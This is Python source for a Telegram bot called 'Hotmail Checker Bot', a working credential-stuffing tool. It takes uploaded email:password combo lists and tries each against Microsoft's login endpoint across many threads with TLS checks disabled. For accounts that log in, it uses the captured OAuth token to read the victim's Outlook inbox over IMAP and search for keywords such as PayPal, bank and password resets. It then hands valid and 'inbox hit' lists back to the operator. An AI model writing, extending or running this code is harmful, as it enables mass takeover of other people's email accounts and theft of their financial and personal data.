import os
import re
import time
import json
import asyncio
import logging
import imaplib
import email
import concurrent.futures
from datetime import datetime
from email.header import decode_header
from urllib.parse import urlparse, parse_qs

import requests
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

urllib3.disable_warnings()

# ─── Config ───
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("Set BOT_TOKEN environment variable!")

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─── States ───
MENU, UPLOAD, KEYWORDS, THREADS, CHECKING = range(5)

# ─── Microsoft Login URL (for getting OAuth token) ───
sFTTag_url = (
    "https://login.live.com/oauth20_authorize.srf?"
    "client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
)


# ─── Per-user session storage ───
def get_user_data(context: ContextTypes.DEFAULT_TYPE) -> dict:
    if "session" not in context.chat_data:
        context.chat_data["session"] = {
            "combos": [],
            "keywords": [],
            "threads": 50,
            "running": False,
            "stop_flag": False,
            "results": {"valid": 0, "bad": 0, "twofa": 0, "inbox": 0, "checked": 0, "retries": 0},
            "files": {"valid": [], "twofa": [], "inbox": []},
            "start_time": None,
            "progress_msg_id": None,
        }
    return context.chat_data["session"]


# ═══════════════════════════════════════════════════════════════
# OAUTH2 IMAP: Use access token instead of password
# ═══════════════════════════════════════════════════════════════
def fetch_inbox_with_oauth(email_addr, access_token, keywords=None, max_emails=500):
    """
    Connects to Outlook/Hotmail via IMAP using OAuth2 access token.
    Searches ALL emails (up to max_emails cap).
    Returns: (success: bool, matched_keywords: list, subjects: list)
    """
    imap = None
    try:
        logger.info(f"[IMAP-OAuth] Connecting: {email_addr}")

        # OAuth2 for IMAP: username + access token as password
        # Format: user={email}\x01auth=Bearer {token}\x01\x01
        auth_string = f"user={email_addr}\x01auth=Bearer {access_token}\x01\x01"

        imap = imaplib.IMAP4_SSL("outlook.office365.com", timeout=20)

        # Use authenticate with XOAUTH2
        imap.authenticate("XOAUTH2", lambda x: auth_string.encode())

        imap.select("INBOX")

        status, messages = imap.search(None, "ALL")
        if status != "OK":
            logger.warning(f"[IMAP-OAuth] Search failed for {email_addr}")
            return False, [], []

        msg_ids = messages[0].split()
        total_emails = len(msg_ids)
        logger.info(f"[IMAP-OAuth] {email_addr} has {total_emails} emails")

        if not msg_ids:
            return False, [], []

        # Scan ALL emails but cap at max_emails
        if total_emails > max_emails:
            logger.info(f"[IMAP-OAuth] Capping from {total_emails} to {max_emails}")
            msg_ids = msg_ids[-max_emails:]

        subjects = []
        matched_keywords = set()

        for msg_id in msg_ids:
            try:
                status, msg_data = imap.fetch(
                    msg_id, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM)])"
                )
                if status != "OK":
                    continue

                for response_part in msg_data:
                    if isinstance(response_part, tuple):
                        msg = email.message_from_bytes(response_part[1])
                        subject_raw = msg.get("Subject", "") or "(No Subject)"
                        from_raw = msg.get("From", "") or "(Unknown)"

                        # Decode subject
                        decoded = decode_header(subject_raw)
                        subject_str = ""
                        for part, charset in decoded:
                            if isinstance(part, bytes):
                                try:
                                    subject_str += part.decode(charset or "utf-8", errors="ignore")
                                except Exception:
                                    subject_str += part.decode("utf-8", errors="ignore")
                            else:
                                subject_str += part

                        # Decode from
                        decoded_from = decode_header(from_raw)
                        from_str = ""
                        for part, charset in decoded_from:
                            if isinstance(part, bytes):
                                try:
                                    from_str += part.decode(charset or "utf-8", errors="ignore")
                                except Exception:
                                    from_str += part.decode("utf-8", errors="ignore")
                            else:
                                from_str += part

                        full_text = f"{subject_str} {from_str}".lower()

                        # Check keywords
                        if keywords:
                            found = [kw for kw in keywords if kw.lower() in full_text]
                            if found:
                                subjects.append(f"{subject_str}  [From: {from_str}]")
                                matched_keywords.update(found)
                        else:
                            subjects.append(f"{subject_str}  [From: {from_str}]")

            except Exception as e:
                logger.debug(f"[IMAP-OAuth] Parse error: {e}")
                continue

        imap.close()
        imap.logout()

        logger.info(
            f"[IMAP-OAuth] {email_addr} done. Matched: {len(matched_keywords)} keywords, "
            f"{len(subjects)} subjects"
        )

        if keywords:
            return len(matched_keywords) > 0, list(matched_keywords), subjects
        return len(subjects) > 0, [], subjects

    except Exception as e:
        logger.warning(f"[IMAP-OAuth] FAILED for {email_addr}: {str(e)}")
        if imap:
            try:
                imap.logout()
            except Exception:
                pass
        return False, [], []


# ═══════════════════════════════════════════════════════════════
# CORE CHECKER: Returns token for IMAP use
# ═══════════════════════════════════════════════════════════════
def get_login_data(session):
    for _ in range(3):
        try:
            text = session.get(sFTTag_url, timeout=10, verify=False).text
            sFTTag = re.search(r'value=\\\"(.+?)\\\"', text, re.S).group(1)
            urlPost = re.search(r'"urlPost":"(.+?)"', text, re.S).group(1)
            return urlPost, sFTTag, session
        except Exception:
            time.sleep(0.5)
    return None, None, session


def check_account(email, password, keywords, stop_flag):
    if stop_flag():
        return "STOPPED", f"{email}:{password}", [], [], None

    session = None
    try:
        session = requests.Session()
        session.verify = False
        urlPost, sFTTag, session = get_login_data(session)
        if not urlPost or not sFTTag:
            return "BAD", f"{email}:{password}", [], [], None

        data = {
            "login": email,
            "loginfmt": email,
            "passwd": password,
            "PPFT": sFTTag,
        }
        req = session.post(
            urlPost,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=True,
            timeout=10,
            verify=False,
        )

        if "#" in req.url and req.url != sFTTag_url:
            token = parse_qs(urlparse(req.url).fragment).get("access_token", ["None"])[0]
            if token != "None":
                # ── VALID ACCOUNT + got OAuth token ──
                inbox_keywords = []
                inbox_subjects = []

                if keywords:
                    logger.info(f"[CHECKER] Running OAuth inboxer for {email}")
                    ok, found_kws, subjects = fetch_inbox_with_oauth(
                        email, token, keywords, max_emails=500
                    )
                    if ok and found_kws:
                        inbox_keywords = found_kws
                        inbox_subjects = subjects
                        logger.info(
                            f"[CHECKER] INBOX HIT: {email} | KWs: {found_kws}"
                        )
                    else:
                        logger.info(f"[CHECKER] No inbox match for {email}")

                return "VALID", f"{email}:{password}", inbox_keywords, inbox_subjects, token

        if any(
            x in req.text
            for x in [
                "recover?mkt",
                "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt",
                "/Abuse?mkt=",
            ]
        ):
            return "2FA", f"{email}:{password}", [], [], None

        if any(
            x in req.text.lower()
            for x in [
                "password is incorrect",
                "account doesn't exist",
                "sign in to your microsoft account",
                "tried to sign in too many times",
            ]
        ):
            return "BAD", f"{email}:{password}", [], [], None

        return "BAD", f"{email}:{password}", [], [], None
    except Exception as e:
        logger.warning(f"[CHECKER] Error for {email}: {e}")
        return "BAD", f"{email}:{password}", [], [], None
    finally:
        if session:
            try:
                session.close()
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════
# BOT HANDLERS
# ═══════════════════════════════════════════════════════════════
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = get_user_data(context)
    session["running"] = False
    session["stop_flag"] = False

    keyboard = [
        [
            InlineKeyboardButton("📁 Upload Combo File", callback_data="upload"),
            InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
        ],
        [
            InlineKeyboardButton("🚀 Start Check", callback_data="start_check"),
            InlineKeyboardButton("📊 Stats", callback_data="stats"),
        ],
        [InlineKeyboardButton("🛑 Stop", callback_data="stop")],
    ]
    await update.message.reply_text(
        "🔥 *Hotmail Checker Bot* 🔥\n\nWelcome! Upload your combo file and start checking.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )
    return MENU


async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    session = get_user_data(context)

    if data == "upload":
        await query.edit_message_text(
            "📁 *Send me a .txt file* with combos (format: `email:pass`)\n\n"
            "One combo per line.",
            parse_mode="Markdown",
        )
        return UPLOAD

    elif data == "settings":
        kw_text = ", ".join(session["keywords"]) if session["keywords"] else "None"
        keyboard = [
            [
                InlineKeyboardButton(
                    f"🔍 Keywords: {kw_text}",
                    callback_data="set_keywords",
                )
            ],
            [
                InlineKeyboardButton(
                    f"⚡ Threads: {session['threads']}", callback_data="set_threads"
                )
            ],
            [InlineKeyboardButton("🔙 Back", callback_data="back")],
        ]
        await query.edit_message_text(
            "⚙️ *Settings*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
        )
        return MENU

    elif data == "set_keywords":
        await query.edit_message_text(
            "🔍 *Enter keywords* separated by commas\n\n"
            "Example: `paypal, amazon, reset, password, bank`\n"
            "Send `.` to clear / disable inboxer.",
            parse_mode="Markdown",
        )
        return KEYWORDS

    elif data == "set_threads":
        await query.edit_message_text(
            "⚡ *Enter thread count* (1-200)\n\n"
            "⚠️ *WARNING:* With inboxer enabled, use LOW threads (5-20)\n"
            "Each account needs 2-5 seconds for IMAP scan.\n\n"
            "Recommended: 10",
            parse_mode="Markdown",
        )
        return THREADS

    elif data == "start_check":
        if not session["combos"]:
            keyboard = [
                [InlineKeyboardButton("📁 Upload Combo File", callback_data="upload")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")],
            ]
            await query.edit_message_text(
                "❌ *No combos loaded!* Upload a file first.",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown",
            )
            return MENU

        if session["running"]:
            await query.edit_message_text(
                "⏳ *Already running!* Use Stats or Stop.",
                parse_mode="Markdown",
            )
            return MENU

        session["running"] = True
        session["stop_flag"] = False
        session["results"] = {
            "valid": 0,
            "bad": 0,
            "twofa": 0,
            "inbox": 0,
            "checked": 0,
            "retries": 0,
        }
        session["files"] = {"valid": [], "twofa": [], "inbox": []}
        session["start_time"] = datetime.now()

        asyncio.create_task(run_checker(update, context))
        return CHECKING

    elif data == "stats":
        if not session["running"] and session["results"]["checked"] == 0:
            await query.edit_message_text(
                "📊 *No active or completed check.*", parse_mode="Markdown"
            )
        else:
            text = format_stats(session)
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
            await query.edit_message_text(
                text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown"
            )
        return MENU

    elif data == "stop":
        if session["running"]:
            session["stop_flag"] = True
            session["running"] = False
            await query.edit_message_text(
                "🛑 *Stopping...* Results will be sent shortly.", parse_mode="Markdown"
            )
        else:
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back")]]
            await query.edit_message_text(
                "ℹ️ *Nothing is running.*",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="Markdown",
            )
        return MENU

    elif data == "back":
        kw_text = ", ".join(session["keywords"]) if session["keywords"] else "None"
        keyboard = [
            [
                InlineKeyboardButton("📁 Upload Combo File", callback_data="upload"),
                InlineKeyboardButton("⚙️ Settings", callback_data="settings"),
            ],
            [
                InlineKeyboardButton("🚀 Start Check", callback_data="start_check"),
                InlineKeyboardButton("📊 Stats", callback_data="stats"),
            ],
            [InlineKeyboardButton("🛑 Stop", callback_data="stop")],
        ]
        await query.edit_message_text(
            "🔥 *Hotmail Checker Bot* 🔥\n\n"
            f"📦 Combos: `{len(session['combos'])}`\n"
            f"🔍 Keywords: `{kw_text}`\n"
            f"⚡ Threads: `{session['threads']}`",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )
        return MENU

    return MENU


async def handle_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = get_user_data(context)
    document = update.message.document

    if not document.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Only `.txt` files allowed!")
        return UPLOAD

    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()

    try:
        content = file_bytes.decode("utf-8", errors="ignore")
    except Exception:
        content = file_bytes.decode("latin-1", errors="ignore")

    combos = []
    for line in content.splitlines():
        line = line.strip().replace(" ", "")
        if line and ":" in line:
            combos.append(line)

    session["combos"] = combos

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]]
    await update.message.reply_text(
        f"✅ *Loaded {len(combos)} combos!*\n\nReady to start checking.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )
    return MENU


async def handle_keywords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = get_user_data(context)
    text = update.message.text.strip()

    if text == ".":
        session["keywords"] = []
        await update.message.reply_text("✅ Keywords cleared. Inboxer disabled.")
    else:
        session["keywords"] = [k.strip().lower() for k in text.split(",") if k.strip()]
        await update.message.reply_text(
            f"✅ Keywords set: `{', '.join(session['keywords'])}`\n\n"
            f"📬 OAuth Inboxer will scan ALL emails (up to 500) for keywords.\n\n"
            f"⚠️ *Use LOW threads (5-20) when inboxer is on!*",
            parse_mode="Markdown",
        )

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]]
    await update.message.reply_text(
        "🔙 Back to menu?", reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return MENU


async def handle_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = get_user_data(context)
    try:
        threads = int(update.message.text.strip())
        session["threads"] = max(1, min(200, threads))
        await update.message.reply_text(
            f"✅ Threads set to `{session['threads']}`", parse_mode="Markdown"
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid number. Using default 50.")
        session["threads"] = 50

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]]
    await update.message.reply_text(
        "🔙 Back to menu?", reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return MENU


def format_stats(session):
    r = session["results"]
    total = len(session["combos"])
    checked = r["checked"]
    percent = (checked / total * 100) if total > 0 else 0
    elapsed = datetime.now() - session["start_time"]
    elapsed_str = str(elapsed).split(".")[0]

    status = "🟢 Running" if session["running"] else "🔴 Stopped"
    if checked >= total and total > 0:
        status = "✅ Complete"

    return (
        f"📊 *Live Stats*\n\n"
        f"Status: {status}\n"
        f"Progress: `{checked}/{total}` (`{percent:.1f}%`)\n"
        f"⏱ Time: `{elapsed_str}`\n\n"
        f"✅ Valid: `{r['valid']}`\n"
        f"📬 Inbox Hits: `{r['inbox']}`\n"
        f"⚠️ 2FA: `{r['twofa']}`\n"
        f"❌ Bad: `{r['bad']}`\n"
        f"🔄 Retries: `{r['retries']}`"
    )


async def update_progress(update: Update, context: ContextTypes.DEFAULT_TYPE, session):
    chat_id = update.effective_chat.id
    text = format_stats(session)

    if session.get("progress_msg_id"):
        try:
            await context.bot.edit_message_text(
                text,
                chat_id=chat_id,
                message_id=session["progress_msg_id"],
                parse_mode="Markdown",
            )
        except Exception:
            pass
    else:
        msg = await context.bot.send_message(chat_id, text, parse_mode="Markdown")
        session["progress_msg_id"] = msg.message_id


async def run_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    session = get_user_data(context)
    combos = session["combos"]
    keywords = session["keywords"]
    threads = session["threads"]
    results = session["results"]

    chat_id = update.effective_chat.id

    # Warn if threads too high with inboxer
    if keywords and threads > 20:
        await context.bot.send_message(
            chat_id,
            "⚠️ *WARNING:* You have inboxer ON with high threads!\n"
            f"Current: `{threads}` threads. Recommended: `10`\n"
            "OAuth IMAP is slow. High threads = timeouts & bans.",
            parse_mode="Markdown",
        )

    msg = await context.bot.send_message(
        chat_id, "🚀 *Starting check...*", parse_mode="Markdown"
    )
    session["progress_msg_id"] = msg.message_id

    def stop_flag():
        return session["stop_flag"]

    def worker(combo_line):
        if stop_flag():
            return None

        try:
            email, password = combo_line.strip().split(":", 1)
        except ValueError:
            results["checked"] += 1
            return None

        result, account, inbox_kws, inbox_subs, token = check_account(
            email, password, keywords, stop_flag
        )

        if result == "VALID":
            results["valid"] += 1
            session["files"]["valid"].append(account)

            if inbox_kws and inbox_subs:
                results["inbox"] += 1
                subs_text = " | ".join(inbox_subs[:20])
                session["files"]["inbox"].append(
                    f"{account}\n"
                    f"   🔍 Keywords: {', '.join(inbox_kws)}\n"
                    f"   📧 Subjects: {subs_text}\n"
                    f"   {'─' * 50}"
                )

        elif result == "2FA":
            results["twofa"] += 1
            session["files"]["twofa"].append(account)

        elif result == "BAD":
            results["bad"] += 1

        results["checked"] += 1
        return result

    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [loop.run_in_executor(executor, worker, c) for c in combos]

        total = len(combos)
        while results["checked"] < total and session["running"]:
            await update_progress(update, context, session)
            await asyncio.sleep(5)

        if not session["stop_flag"]:
            await asyncio.gather(*futures, return_exceptions=True)

    session["running"] = False
    await update_progress(update, context, session)
    await send_results(context, chat_id, session)

    keyboard = [
        [
            InlineKeyboardButton("📁 Upload New File", callback_data="upload"),
            InlineKeyboardButton("🔙 Menu", callback_data="back"),
        ]
    ]
    await context.bot.send_message(
        chat_id,
        "✅ *Check complete!* Files sent above.\n\nReady for next run.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown",
    )


async def send_results(context, chat_id, session):
    files = session["files"]

    if files["valid"]:
        content = "\n".join(files["valid"])
        await context.bot.send_document(
            chat_id,
            document=content.encode(),
            filename="valid.txt",
            caption=f"✅ Valid Accounts ({len(files['valid'])})",
        )

    if files["twofa"]:
        content = "\n".join(files["twofa"])
        await context.bot.send_document(
            chat_id,
            document=content.encode(),
            filename="2fa.txt",
            caption=f"⚠️ 2FA Accounts ({len(files['twofa'])})",
        )

    if files["inbox"]:
        content = "\n\n".join(files["inbox"])
        await context.bot.send_document(
            chat_id,
            document=content.encode(),
            filename="inbox_hits.txt",
            caption=f"📬 Inbox Hits with Subjects ({len(files['inbox'])})",
        )

    if not any(files.values()):
        await context.bot.send_message(chat_id, "📭 No hits found in this run.")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END


def main():
    application = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MENU: [CallbackQueryHandler(menu_callback)],
            UPLOAD: [
                MessageHandler(filters.Document.TXT, handle_upload),
                CallbackQueryHandler(menu_callback),
            ],
            KEYWORDS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_keywords),
                CallbackQueryHandler(menu_callback),
            ],
            THREADS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_threads),
                CallbackQueryHandler(menu_callback),
            ],
            CHECKING: [CallbackQueryHandler(menu_callback)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
